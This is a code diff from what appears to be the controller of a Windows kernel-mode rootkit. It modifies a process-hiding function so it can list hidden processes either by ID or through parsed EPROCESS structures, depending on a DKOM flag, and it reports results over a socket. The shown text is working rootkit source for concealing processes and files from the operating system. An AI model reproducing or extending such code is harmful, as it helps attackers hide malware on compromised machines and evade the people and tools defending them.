@@ -525,11 +525,12 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 }
 
 
-BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
+BOOL HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int ProcessId, int RemoveIndex, SOCKET tosock, NTSTATUS RequestStatus) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	PVOID HiddenProcesses = NULL;
 	SHORTENEDACTEPROCESS CurrentProcess = { 0 };
+	ULONG64 CurrentProcessId = 0;
 	int CurrentIndex = 0;
 	printf("=====HideProcess=====\n\n");
 	RootkInstructions.Operation = RKOP_HIDEPROC;
@@ -615,10 +616,18 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 			return FALSE;
 		}
 		printf("Currently hidden processes (dynamically):\n");
-		for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += sizeof(SHORTENEDACTEPROCESS)) {
-			RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), sizeof(SHORTENEDACTEPROCESS));
-			printf("Process number %llu -\n", hiddeni / sizeof(SHORTENEDACTEPROCESS));
-			ParseEprocess(CurrentProcess);
+		if (!IS_DKOM) {
+			for (ULONG PidIndex = 0; PidIndex < RootkInstructions.Size; PidIndex += sizeof(ULONG64)) {
+				RtlCopyMemory(&CurrentProcessId, (PVOID)((ULONG64)HiddenProcesses + PidIndex), sizeof(CurrentProcessId));
+				printf("Process number %llu - %llu\n", PidIndex / sizeof(ULONG64), CurrentProcessId);
+			}
+		}
+		else {
+			for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += sizeof(SHORTENEDACTEPROCESS)) {
+				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), sizeof(SHORTENEDACTEPROCESS));
+				printf("Process number %llu -\n", hiddeni / sizeof(SHORTENEDACTEPROCESS));
+				ParseEprocess(CurrentProcess);
+			}
 		}
 	}
 	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
